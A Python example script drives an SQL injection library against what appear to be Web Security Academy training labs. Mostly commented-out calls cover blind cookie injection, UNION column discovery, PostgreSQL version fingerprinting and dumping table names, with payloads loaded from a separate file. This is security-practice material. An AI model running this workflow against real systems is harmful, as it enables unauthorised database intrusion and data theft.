from injection_warrior import sqli_blind, sqli_union
from injection_warrior import warrior
import os
import sys
import json

script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
rel_path = "injection_warrior/payloads.json"
abs_file_path = os.path.join(script_dir, rel_path)
f_payloads = open(abs_file_path.replace('/examples', ''), 'r')
sqli_payloads = json.load(f_payloads)

u_obj = sqli_union.SQLiUnion(proxy="http://127.0.0.1:8080", debug=True)
# u_obj = sqli_union.SQLiUnion(proxy="http://127.0.0.1:8080", debug=True)

#url = "https://ac1c1f261fe6745280e40582005600c5.web-security-academy.net/filter"
url = "https://ac9b1ff01f050f238079730400e500ad.web-security-academy.net"

probe_payloads= sqli_payloads['sqli']['base']['probes']
base_payloads= sqli_payloads['sqli']['base']['quotes']

test_payloads = sqli_payloads.get('sqli').get('database_content').get('tests')
# blind_sqli_obj.inject_payload(
#     url=url,  
#     http_method="get", 
#     injection_point="cookie",
#     cookie_params={"TrackingId": "$"},
#     param_value="", 
#     delimiter=' ',
#     payloads= probe_payloads,
#     comment="--",
#     comma=","
#     )

# data = u_obj.union_find_columns_number(
#     url=url, 
#     http_method="get", 
#     columns=3, 
#     injection_method="null", 
#     injection_point="url", 
#     url_params={'category': '%$%'},
#     param_value="Gifts",
#     resp_json=False,
#     req_json=False,
#     oracle=False,
#     html=True,
#     delimiter=' ')

# string = "Va1abL"
# data = u_obj.union_find_string_in_columns(
#     url=url, 
#     string=string, 
#     columns=2, 
#     http_method="get", 
#     injection_point="url", 
#     url_params={'category': '%$%'},
#     param_value="Gifts",
#     resp_json=False,
#     req_json=False,
#     oracle=False,
#     html=True,
#     quote="'",
#     delimiter=' ')

# payload = ''
# payloads = []
# for r in data:
#     if r[1].status == 200:
#         payload = r[1].url.query_string.split("=")[1]
#         payloads.append(payload)
  
# data = u_obj.union_identify_database_version(
#     url=url,
#     http_method="get", 
#     payloads=payloads, 
#     injection_point="url",
#     dbms="postgreSQL",
#     url_params={'category':'%$%'},
#     resp_json=False,
#     req_json=False,
#     delimiter = ' ',
#     comma=",",
#     nulls=1,
#     string=string,
#     html=True)

# data = u_obj.inject_payload(
#     url=url,  
#     http_method="get", 
#     injection_point="url", 
#     dbms="postgreSQL",
#     payloads = [sqli_payloads.get('sqli').get('database_content').get('union').get('postgreSQL').get('overall')],
#     url_params={'category':'%$%'},
#     delimiter=' ',
#     comment="--",
#     comma=",",
#     html=True,
#     nulls=1,
#     column_name_1="column_name", column_name_2="table_name", table_name=""
#     )

# f = open('database1.txt', 'w')
# for r in resp:
#     data = r.find_all('th')
#     for d in data:
#         # print(d.html)
#         f.write(d.html+"\r\n")
